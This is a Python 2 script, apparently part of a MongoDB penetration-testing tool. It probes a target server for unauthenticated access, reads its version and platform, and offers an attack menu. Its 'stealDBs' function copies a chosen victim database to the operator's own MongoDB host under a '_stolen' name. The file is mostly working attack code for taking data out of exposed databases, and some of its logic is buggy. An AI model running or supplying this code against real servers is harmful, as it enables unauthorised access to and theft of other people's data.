import pymongo

global yes_tag
global no_tag
yes_tag = ['y','Y']
no_tag = ['n','N']

def netAttacks(target, dbPort, myIP, myPort):
    print "DB access attacks(mongoDB)"
    print "========================="
    mongoOpen = False
    mgtSelect = True
    print "Checking to see if crendentials are need"
    needCreds = mongoScan(target,dbPort)
    if needCreds[0]==0:
        conn = pymongo.MongoClient(target,dbPort)
        print target
        print "\n" + str(dbPort)
        print "Successful access with no credentials!"
        mongoOpen = True
    elif needCreds[0]==1:
        print "login required!"
        victimUser = raw_input("Enter server username:")
        victimPass = raw_input("Enter server password:")

    elif needCreds[0]==2:
        conn = pymongo.MongoClient(target,dbPort)
        print "Access check failure. Testing will continue but will be unreliable."
        mongoOpen = True
    elif needCreds[0]==3:
        print "Counldn't connect to MongoDB server."

    if mongoOpen == True:
        while mgtSelect:
            print "\n"
            print "1-Get Server Version and Platform"
            print "2-Enumerate Databases/Collections/Users"
            print "3-Check for GridFS"
            print "4-Clone a Database"
            print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
            print "6-Return to Main Menu"
            attack = raw_input("Select an attack: ")

            if attack == '1':
                print "\n"
                getPlatInfo(conn)
            if attack == '4':
                print "\n"
                if myIP == "NOT SET":
                    print "Target database not set"
                else:
                    stealDBs(myIP,target,conn)



            elif attack == '6':
                return



def stealDBs(myDBIP,victim,mongoConn):
    dbList = mongoConn.database_names()
    dbLoot = True
    menuItem = 1

    if len(dbList) == 0:
        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
        return
    for dbname in dbList:
        print str(menuItem) + "_" + dbname
        menuItem += 1
    while dbLoot:
        dbLoot = int(raw_input("Select a database to steal:"))
        if int(dbLoot) >= menuItem:
            print "Invalid selection."
        else:
            break
    try:
        dbNeedCreds = raw_input("Does this Database require credentials.(y/n)?")
        myDBConn = pymongo.MongoClient(myDBIP, 27017)
        if dbNeedCreds in no_tag:
            myDBConn.copy_database(dbList[dbLoot-1],dbList[dbLoot-1] + "_stolen",victim)
        elif dbNeedCreds in yes_tag:
            dbUser = raw_input("Enter database username:")
            dbPass = raw_input("Enter database password:")
            myDBConn.copy_database(dbList[dbLoot-1],dbList[dbLoot-1] + "_stolen",victim,dbUser,dbPass)
        else:
            raw_input("Invalid Selection. Press enter to continue!")
            stealDBs(myDBConn,victim,mongoConn)
        cloneAnother = raw_input("Database cloned. Copy another (y/n)?")

        if cloneAnother in yes_tag:
            stealDBs(myDBIP,victim,mongoConn)
        else:
            return
    except Exception, e:
        print str(e)
        if str(e).find('text search not enabled'):
            raw_input(
                "Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
            return
        elif str(e).find('Network is unreachable') != -1:
            raw_input("Are you sure your network is unreachable? Press enter to return..")
        else:# this part should also have other error reason not only the "Are you sure your MongoDB is running and options are set?"
            raw_input(
                "Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
            return



def getPlatInfo (mongoConn):
	print "Server Info:"
	print "MongoDB Version: " + mongoConn.server_info()['version']
	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
	print "\n"
	return

def mongoScan(ip,port):
    try:
        conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
        try:
            dbVer= conn.server_info()['version']
            conn.close();
            return [0,dbVer]
        except Exception, e:
            if str(e).find('need to login')!=-1:#If find the 'need to login' in error message, we can consider target need credentials
                conn.close();
                return[1,None]
            else:
                conn.close();
                return[2,None]
    except:
        return [3,None]

